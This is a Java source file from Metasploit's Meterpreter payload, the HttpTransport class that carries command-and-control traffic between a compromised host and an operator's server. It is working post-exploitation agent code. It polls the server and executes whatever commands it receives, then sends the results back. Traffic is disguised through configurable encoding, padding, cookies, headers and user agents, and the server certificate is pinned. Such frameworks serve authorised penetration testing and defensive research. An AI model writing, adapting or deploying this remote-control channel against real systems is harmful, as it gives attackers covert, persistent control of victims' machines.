package com.metasploit.meterpreter;

import com.metasploit.TLVPacket;
import com.metasploit.TLVType;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.stage.C2VerbConfig;
import com.metasploit.stage.HttpConnection;
import com.metasploit.stage.PayloadTrustManager;
import com.metasploit.stage.TransportConfig;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

public class HttpTransport extends Transport {

    private static final int C2_ENCODING_NONE = 0;
    private static final int C2_ENCODING_B64 = 1;
    private static final int C2_ENCODING_B64URL = 2;

    private URL targetUrl = null;
    private URL nextUrl = null;
    private String userAgent;
    private String proxyUrl;
    private String proxyUser;
    private String proxyPass;
    private String customHeaders;
    private byte[] certHash;
    private C2VerbConfig c2Get;
    private C2VerbConfig c2Post;

    public HttpTransport(Meterpreter met, String url) throws MalformedURLException {
        super(met, url);
        this.targetUrl = new URL(url);
    }

    public HttpTransport(Meterpreter met, String url, TransportConfig transportConfig) throws MalformedURLException {
        this(met, url);
        userAgent = transportConfig.user_agent;
        proxyUrl = transportConfig.proxy_url;
        proxyUser = transportConfig.proxy_user;
        proxyPass = transportConfig.proxy_pass;
        certHash = transportConfig.cert_hash;
        customHeaders = transportConfig.custom_headers;
        c2Get = transportConfig.c2Get;
        c2Post = transportConfig.c2Post;
        setTimeouts(transportConfig);
    }

    @Override
    public void bind(DataInputStream in, OutputStream rawOut) {
        // http, we don't bind to anything as we're stateless
    }

    @Override
    public boolean patchUuid(String uuid) {
        try {
            // can't use getAuthority() here thanks to java 1.2. Ugh.
            String newUrl = this.targetUrl.getProtocol() + "://"
              + this.targetUrl.getHost() + ":"
              + this.targetUrl.getPort() + "/"
              + uuid;
            this.nextUrl = new URL(newUrl);
            return true;
        }
        catch (MalformedURLException ex) {
          return false;
        }
    }

    public String getUserAgent() {
        return this.userAgent;
    }

    public void setUserAgent(String userAgent) {
        this.userAgent = userAgent;
    }

    public String getProxyUrl() {
        return this.proxyUrl;
    }

    public void setProxyUrl(String proxyUrl) {
        this.proxyUrl = proxyUrl;
    }

    public String getProxyUser() {
        return this.proxyUser;
    }

    public void setProxyUser(String proxyUser) {
        this.proxyUser = proxyUser;
    }

    public String getProxyPass() {
        return this.proxyPass;
    }

    public void setProxyPass(String proxyPass) {
        this.proxyPass = proxyPass;
    }

    public byte[] getCertHash() {
        return this.certHash;
    }

    public void setCertHash(byte[] certHash) {
        this.certHash = certHash;
    }

    public String getCustomHeaders() {
        return this.customHeaders;
    }

    public C2VerbConfig getC2Get() {
        return this.c2Get;
    }

    public void setC2Get(C2VerbConfig c2Get) {
        this.c2Get = c2Get;
    }

    public C2VerbConfig getC2Post() {
        return this.c2Post;
    }

    public void setC2Post(C2VerbConfig c2Post) {
        this.c2Post = c2Post;
    }

    @Override
    public void disconnect() {
    }

    @Override
    protected boolean tryConnect(Meterpreter met) throws IOException {
        URLConnection conn = this.createGetConnection();

        if (conn == null) {
            return false;
        }

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
            byte[] rawResponse = readAllBytes(inputStream);
            inputStream.close();

            byte[] decoded = decodeResponse(rawResponse, this.c2Get);
            if (decoded.length == 0) {
                // reconnect scenario - empty response
                return true;
            }

            TLVPacket request = this.readAndDecodePacket(new DataInputStream(new ByteArrayInputStream(decoded)));

            // things are looking good, handle the packet and return true, as this
            // is the situation that happens on initial connect (not reconnect)
            TLVPacket response = request.createResponse();
            int result = met.getCommandManager().executeCommand(met, request, response);
            if (result == Command.EXIT_DISPATCH) {
                return true;
            }
            this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);

            return true;
        }
        catch (EOFException ex) {
            // this can happens on reconnect
            return true;
        }
        catch (Exception ignored) {
        }

        // we get here, things aren't good.
        return false;
    }

    @Override
    public TLVPacket readPacket() throws IOException {
        URLConnection conn = this.createGetConnection();

        if (conn == null) {
            return null;
        }

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
            byte[] rawResponse = readAllBytes(inputStream);
            inputStream.close();

            byte[] decoded = decodeResponse(rawResponse, this.c2Get);
            if (decoded.length == 0) {
                return null;
            }

            return this.readAndDecodePacket(new DataInputStream(new ByteArrayInputStream(decoded)));
        }
        catch (EOFException ignored) {
        }

        return null;
    }

    @Override
    public void writePacket(TLVPacket packet, int type) throws IOException {
        // Encode the packet to raw bytes first
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream tempOut = new DataOutputStream(baos);
        this.encodePacketAndWrite(packet, type, tempOut);
        byte[] packetBytes = baos.toByteArray();

        byte[] body = encodeRequest(packetBytes, this.c2Post);

        URLConnection conn = this.createPostConnection();

        if (conn == null) {
            return;
        }

        conn.setDoOutput(true);
        DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
        outputStream.write(body);
        outputStream.close();

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
            // read and discard the response
            readAllBytes(inputStream);
            inputStream.close();
        }
        catch (EOFException ex) {
            // log error?
        }
    }

    @Override
    public boolean dispatch(Meterpreter met) {
        long lastPacket = System.currentTimeMillis();
        long ecount = 0;

        while (!met.hasSessionExpired() &&
            System.currentTimeMillis() < lastPacket + this.commTimeout) {
            try {
                useNextUrl();
                TLVPacket request = this.readPacket();

                if (request != null) {
                    ecount = 0;

                    // got a packet, update the timestamp
                    lastPacket = System.currentTimeMillis();

                    TLVPacket response = request.createResponse();
                    int result = met.getCommandManager().executeCommand(met, request, response);

                    // Make sure the UUID is baked into each response.
                    response.add(TLVType.TLV_TYPE_UUID, met.getUUID());

                    this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);

                    if (result == Command.EXIT_DISPATCH) {
                        return true;
                    }
                } else {
                    long delay = ecount++ * 10;
                    if (ecount >= 10) {
                        delay *= 10;
                    }
                    met.sleep(Math.min(10000, delay));
                }
            } catch (Exception ex) {
                // any other type of exception isn't good.
                break;
            }

        }

        // if we get here we assume things aren't good.
        return false;
    }

    private void useNextUrl() {
        // see if we switched URLs along the way, and if we did, move it on over.
        if (this.nextUrl != null) {
            this.url = this.nextUrl.toString();
            this.targetUrl = this.nextUrl;
            this.nextUrl = null;
        }
    }

    private String getUuidFromUrl() {
        String path = this.targetUrl.getPath();
        if (path == null || path.length() <= 1) {
            return "";
        }
        // Strip leading slash and any trailing slash
        path = path.substring(1);
        if (path.endsWith("/")) {
            path = path.substring(0, path.length() - 1);
        }
        // Get the last path segment
        int lastSlash = path.lastIndexOf('/');
        if (lastSlash >= 0) {
            return path.substring(lastSlash + 1);
        }
        return path;
    }

    private URL buildProfileUrl(C2VerbConfig profile) throws MalformedURLException {
        if (profile == null || profile.uri == null) {
            return this.targetUrl;
        }

        String baseUrl = this.targetUrl.getProtocol() + "://"
            + this.targetUrl.getHost() + ":"
            + this.targetUrl.getPort();

        String uri = profile.uri;
        if (!uri.startsWith("/")) {
            uri = "/" + uri;
        }

        String fullUrl = baseUrl + uri;

        // Add UUID as query parameter if configured
        if (profile.uuidGet != null) {
            String uuid = getUuidFromUrl();
            if (uuid.length() > 0) {
                String separator = fullUrl.indexOf('?') >= 0 ? "&" : "?";
                fullUrl = fullUrl + separator + profile.uuidGet + "=" + uuid;
            }
        }

        return new URL(fullUrl);
    }

    private void applyProfileHeaders(URLConnection conn, C2VerbConfig profile) {
        if (profile == null) {
            return;
        }
        if (profile.uuidHeader != null) {
            String uuid = getUuidFromUrl();
            if (uuid.length() > 0) {
                conn.addRequestProperty(profile.uuidHeader, uuid);
            }
        }
        if (profile.uuidCookie != null) {
            String uuid = getUuidFromUrl();
            if (uuid.length() > 0) {
                conn.addRequestProperty("Cookie", profile.uuidCookie + "=" + uuid);
            }
        }
    }

    private URLConnection createGetConnection() {
        try {
            URL url = buildProfileUrl(this.c2Get);
            URLConnection conn = url.openConnection();
            HttpConnection.addRequestHeaders(conn, customHeaders, userAgent);
            applyProfileHeaders(conn, this.c2Get);

            if (url.getProtocol().equals("https")) {
                try {
                    PayloadTrustManager.useFor(conn, certHash);
                } catch (Exception ex) {
                }
            }
            return conn;
        }
        catch (IOException ex) {
            return null;
        }
    }

    private URLConnection createPostConnection() {
        try {
            URL url = buildProfileUrl(this.c2Post);
            URLConnection conn = url.openConnection();
            HttpConnection.addRequestHeaders(conn, customHeaders, userAgent);
            applyProfileHeaders(conn, this.c2Post);

            if (url.getProtocol().equals("https")) {
                try {
                    PayloadTrustManager.useFor(conn, certHash);
                } catch (Exception ex) {
                }
            }
            return conn;
        }
        catch (IOException ex) {
            return null;
        }
    }

    private static final char[] B64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".toCharArray();
    private static final char[] B64URL_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".toCharArray();

    private static byte[] base64Encode(byte[] data, char[] alphabet, boolean pad) {
        int len = data.length;
        int outLen = ((len + 2) / 3) * 4;
        char[] out = new char[outLen];
        int i = 0, j = 0;
        while (i < len) {
            int b0 = data[i++] & 0xFF;
            int b1 = (i < len) ? (data[i++] & 0xFF) : 0;
            int b2 = (i < len) ? (data[i++] & 0xFF) : 0;
            int triplet = (b0 << 16) | (b1 << 8) | b2;
            out[j++] = alphabet[(triplet >> 18) & 0x3F];
            out[j++] = alphabet[(triplet >> 12) & 0x3F];
            out[j++] = alphabet[(triplet >> 6) & 0x3F];
            out[j++] = alphabet[triplet & 0x3F];
        }
        int padding = (3 - (len % 3)) % 3;
        if (pad) {
            for (int p = 0; p < padding; p++) {
                out[outLen - 1 - p] = '=';
            }
        }
        String result = new String(out, 0, pad ? outLen : outLen - padding);
        try {
            return result.getBytes("US-ASCII");
        } catch (java.io.UnsupportedEncodingException e) {
            return result.getBytes();
        }
    }

    private static byte[] base64Decode(byte[] data) {
        // Build reverse lookup — works for both standard and URL-safe alphabets
        int[] lookup = new int[128];
        for (int i = 0; i < 128; i++) lookup[i] = -1;
        for (int i = 0; i < B64_CHARS.length; i++) lookup[B64_CHARS[i]] = i;
        lookup['-'] = 62;
        lookup['_'] = 63;

        // Strip padding and whitespace
        int len = data.length;
        while (len > 0 && (data[len - 1] == '=' || data[len - 1] == '\n' || data[len - 1] == '\r')) {
            len--;
        }

        int outLen = (len * 3) / 4;
        byte[] out = new byte[outLen];
        int i = 0, j = 0;
        while (i < len) {
            int b0 = (i < len) ? lookup[data[i++] & 0x7F] : 0;
            int b1 = (i < len) ? lookup[data[i++] & 0x7F] : 0;
            int b2 = (i < len) ? lookup[data[i++] & 0x7F] : 0;
            int b3 = (i < len) ? lookup[data[i++] & 0x7F] : 0;
            int triplet = (b0 << 18) | (b1 << 12) | (b2 << 6) | b3;
            if (j < outLen) out[j++] = (byte)((triplet >> 16) & 0xFF);
            if (j < outLen) out[j++] = (byte)((triplet >> 8) & 0xFF);
            if (j < outLen) out[j++] = (byte)(triplet & 0xFF);
        }
        return out;
    }

    private static byte[] c2Encode(byte[] data, int enc) {
        if (enc == C2_ENCODING_B64) {
            return base64Encode(data, B64_CHARS, true);
        } else if (enc == C2_ENCODING_B64URL) {
            return base64Encode(data, B64URL_CHARS, false);
        }
        return data;
    }

    private static byte[] c2Decode(byte[] data, int enc) {
        if (enc == C2_ENCODING_B64 || enc == C2_ENCODING_B64URL) {
            return base64Decode(data);
        }
        return data;
    }

    private static byte[] decodeResponse(byte[] rawResponse, C2VerbConfig profile) {
        if (rawResponse == null || rawResponse.length == 0) {
            return new byte[0];
        }

        if (profile == null) {
            return rawResponse;
        }

        int start = profile.prefixSkip;
        int end = rawResponse.length - profile.suffixSkip;
        if (start >= end || start < 0 || end > rawResponse.length) {
            return rawResponse;
        }

        byte[] stripped = new byte[end - start];
        System.arraycopy(rawResponse, start, stripped, 0, stripped.length);

        return c2Decode(stripped, profile.enc);
    }

    private static byte[] encodeRequest(byte[] data, C2VerbConfig profile) {
        if (profile == null) {
            return data;
        }

        byte[] encoded = c2Encode(data, profile.enc);

        byte[] prefix = profile.prefix;
        byte[] suffix = profile.suffix;

        if ((prefix == null || prefix.length == 0) && (suffix == null || suffix.length == 0)) {
            return encoded;
        }

        int prefixLen = (prefix != null) ? prefix.length : 0;
        int suffixLen = (suffix != null) ? suffix.length : 0;
        byte[] result = new byte[prefixLen + encoded.length + suffixLen];

        if (prefixLen > 0) {
            System.arraycopy(prefix, 0, result, 0, prefixLen);
        }
        System.arraycopy(encoded, 0, result, prefixLen, encoded.length);
        if (suffixLen > 0) {
            System.arraycopy(suffix, 0, result, prefixLen + encoded.length, suffixLen);
        }

        return result;
    }

    private static byte[] readAllBytes(DataInputStream in) throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] chunk = new byte[4096];
        int bytesRead;
        while ((bytesRead = in.read(chunk)) != -1) {
            buffer.write(chunk, 0, bytesRead);
        }
        return buffer.toByteArray();
    }
}
